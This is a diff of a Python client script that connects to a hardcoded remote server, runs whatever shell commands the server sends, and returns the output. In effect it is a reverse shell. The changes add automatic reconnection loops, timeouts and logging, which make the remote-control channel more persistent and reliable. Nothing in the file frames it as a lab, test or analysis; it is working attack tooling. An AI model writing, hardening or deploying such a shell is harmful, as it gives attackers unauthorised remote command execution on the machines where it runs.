@@ -1,20 +1,23 @@
-"""
-Client file
-"""
 import socket
 import subprocess
 import shlex
 import os
+import time
+import logging
 
-SERVER = "192.168.193.113" #Specify the Server IP here
+# Setup logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
+logger = logging.getLogger(__name__)
+
+SERVER = "192.168.193.113"  # Your server IP
 PORT = 6769
 END_MARKER = b"\n--END--\n"
 
 def run_cmd(cmd):
-    """
-    Run a command and return bytes of stdout+stderr.
-    We keep shell=True for compatibility with common shell constructs.
-    """
+    """Run a command and return bytes of stdout+stderr."""
     try:
         completed = subprocess.run(
             cmd,
@@ -24,15 +27,13 @@ def run_cmd(cmd):
             timeout=60
         )
         return completed.stdout
+    except subprocess.TimeoutExpired:
+        return b"Command timed out after 60 seconds\n"
     except Exception as e:
         return f"Command error: {e}\n".encode()
 
 def handle_cd(parts):
-    """
-    parts is a list from shlex.split(cmd).
-    Returns bytes reply to send back to server.
-    """
-    # cd with no args -> HOME
+    """Handle cd command specially."""
     target = parts[1] if len(parts) > 1 else os.path.expanduser("~")
     target = os.path.expanduser(target)
     try:
@@ -41,55 +42,74 @@ def handle_cd(parts):
     except Exception as e:
         return f"cd failed: {e}\n".encode()
 
+def connect_to_server():
+    """Connect to server with retry logic."""
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(30)
+            s.connect((SERVER, PORT))
+            logger.info(f"Connected to server {SERVER}:{PORT}")
+            return s
+        except Exception as e:
+            logger.error(f"Connection failed: {e}. Retrying in 30 seconds...")
+            time.sleep(30)
+
 def main():
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((SERVER, PORT))
-        print("Connected to server", SERVER, PORT)
-        buffer = b""
-        while True:
-            chunk = s.recv(4096)
-            if not chunk:
-                print("Server closed connection")
-                break
-            buffer += chunk
+    while True:
+        try:
+            with connect_to_server() as s:
+                buffer = b""
+                while True:
+                    try:
+                        chunk = s.recv(4096)
+                        if not chunk:
+                            logger.warning("Server closed connection")
+                            break
+                        buffer += chunk
 
-            # process one or more newline-delimited commands
-            while b"\n" in buffer:
-                line, _, buffer = buffer.partition(b"\n")
-                cmd = line.decode().strip()
-                if not cmd:
-                    # empty command -> send empty reply
-                    s.sendall(b"\n" + END_MARKER)
-                    continue
+                        while b"\n" in buffer:
+                            line, _, buffer = buffer.partition(b"\n")
+                            cmd = line.decode().strip()
+                            
+                            if not cmd:
+                                s.sendall(b"\n" + END_MARKER)
+                                continue
 
-                # built-in handling for exit
-                if cmd.lower() == "exit":
-                    print("Exit received")
-                    s.sendall(b"Exiting\n" + END_MARKER)
-                    return
+                            if cmd.lower() == "exit":
+                                logger.info("Exit command received")
+                                s.sendall(b"Exiting\n" + END_MARKER)
+                                return
 
-                # tokenise to inspect command (handles quotes)
-                try:
-                    parts = shlex.split(cmd)
-                except Exception:
-                    # fallback: run raw command if tokenization fails
-                    parts = []
+                            try:
+                                parts = shlex.split(cmd)
+                            except Exception:
+                                parts = []
 
-                # handle cd specially (persistent)
-                if parts and parts[0] == "cd":
-                    reply = handle_cd(parts)
-                    s.sendall(reply + END_MARKER)
-                    continue
+                            if parts and parts[0] == "cd":
+                                reply = handle_cd(parts)
+                                s.sendall(reply + END_MARKER)
+                                continue
 
-                # otherwise execute normally
-                output = run_cmd(cmd)
-                # ensure there's at least a newline so server printing looks nice
-                if not output.endswith(b"\n"):
-                    output += b"\n"
-                s.sendall(output + END_MARKER)
+                            output = run_cmd(cmd)
+                            if not output.endswith(b"\n"):
+                                output += b"\n"
+                            s.sendall(output + END_MARKER)
+                            
+                    except socket.timeout:
+                        continue
+                    except Exception as e:
+                        logger.error(f"Error in main loop: {e}")
+                        break
+                        
+        except Exception as e:
+            logger.error(f"Main connection error: {e}. Restarting in 10 seconds...")
+            time.sleep(10)
 
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print("Client interrupted, exiting.")
+        logger.info("Client interrupted, exiting.")
+    except Exception as e:
+        logger.error(f"Unexpected error: {e}")
